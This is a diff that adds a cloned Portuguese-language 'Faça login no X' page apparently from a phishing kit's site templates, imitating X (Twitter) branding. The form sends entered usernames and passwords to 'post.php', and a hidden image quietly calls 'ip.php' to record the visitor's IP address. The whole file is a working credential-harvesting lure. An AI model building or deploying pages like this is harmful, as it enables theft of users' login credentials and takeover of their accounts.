@@ -1,0 +1,34 @@
+<!-- .sites/twitter/index.html -->
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>X. Entre para ver o que está acontecendo.</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #000; width: 500px; padding: 40px; border-radius: 32px; color: #fff; text-align: center; }
+        .logo svg { width: 50px; fill: white; }
+        h1 { font-size: 31px; margin: 40px 0 24px; }
+        input { width: 100%; padding: 16px; margin: 8px 0; background: #000; border: 1px solid #2f3336; border-radius: 8px; color: #fff; font-size: 16px; }
+        input:focus { outline: none; border-color: #1d9bf0; }
+        button { background: #fff; color: #000; border: none; width: 100%; padding: 12px; border-radius: 26px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 16px; }
+        .alt { margin-top: 40px; font-size: 14px; color: #71767b; }
+        .alt a { color: #1d9bf0; text-decoration: none; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="white"></path></g></svg>
+    </div>
+    <h1>Faça login no X</h1>
+    <form method="POST" action="post.php">
+        <input type="text" name="username" placeholder="E-mail, telefone ou nome de usuário" autocomplete="off" required>
+        <input type="password" name="password" placeholder="Senha" required>
+        <button type="submit">Entrar</button>
+    </form>
+    <div class="alt"><a href="#">Esqueceu a senha?</a> · <a href="#">Inscrever-se no X</a></div>
+</div>
+<img src="ip.php" style="display:none;">
+</body>
+</html>
